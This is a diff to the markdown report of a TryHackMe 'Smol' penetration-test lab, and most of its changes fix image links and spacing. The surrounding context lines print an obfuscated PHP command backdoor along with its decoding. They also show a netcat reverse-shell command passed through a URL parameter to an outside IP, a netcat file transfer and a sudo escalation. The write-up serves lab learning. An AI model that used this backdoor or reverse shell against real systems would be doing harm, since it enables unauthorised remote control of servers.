@@ -1,8 +1,11 @@
 # Project: Smol Penetration Test (TryHackMe)
 
 **Date**: December 2025
+
 **Target**: 10.64.187.45 (www.smol.thm)
+
 **Tools Used**: Nmap, Gobuster, Burp Suite, John the Ripper, Zip2John, Netcat, SSH
+
 **Vulnerability Explored**: Local File Inclusion (LFI), PHP Backdoor, Weak Credentials, Sudo Misconfiguration
 
 ## 1\. Executive Summary
@@ -28,7 +31,7 @@ nmap -sV 10.64.187.45
 * **Port 22**: OpenSSH 8.2p1 (Ubuntu).
 * **Port 80**: Apache httpd 2.4.41.
 
-!\[Nmap output](img/nmap\_output.png)
+![Nmap output](img/nmap_output.png)
 
 Attempts to enumerate the web server using Gobuster initially failed due to DNS resolution errors. I manually added the domain `www.smol.thm` to my `/etc/hosts` file to resolve this.
 
@@ -67,7 +70,7 @@ if (isset($\_GET\["\\143\\155\\x64"])) { system($\_GET\["\\143\\x6d\\144"]); }
 
 This obfuscated code translates to: `if (isset($\_GET\['cmd'])) { system($\_GET\['cmd']); }`.
 
-!\[Backdoor code](img/backdoor\_code.png)
+![Backdoor code](img/backdoor_code.png)
 
 ### Step 3: Exploitation (RCE)
 
@@ -83,7 +86,7 @@ http://www.smol.thm/wp-admin/index.php?cmd=busybox nc 192.168.151.228 5556 -e ba
 
 **Result**: I successfully received a reverse shell as the `www-data` user.
 
-!\[Reverse shell](img/reverse\_shell.png)
+![Reverse shell](img/reverse_shell.png)
 
 ### Step 4: Post-Exploitation \& Lateral Movement
 
@@ -127,7 +130,7 @@ Switched to `Gege`'s as they are in the same user group. In `Gege`'s home direct
 
 ```bash
 # Target
-nc -w 3 <Attacker\_IP> 9999 < wordpress.old.zip
+nc -w 3  9999 < wordpress.old.zip
 # Attacker
 nc -lnp 9999 > wordpress.old.zip
 ```
@@ -157,7 +160,7 @@ sudo bash
 
 **Final Flag:** `4782a1a89025141569a9307525f68b3d`
 
-!\[Root shell](img/root\_shell.png)
+![Root shell](img/root_shell.png)
 
 ## 3\. Remediation \& Recommendations
 
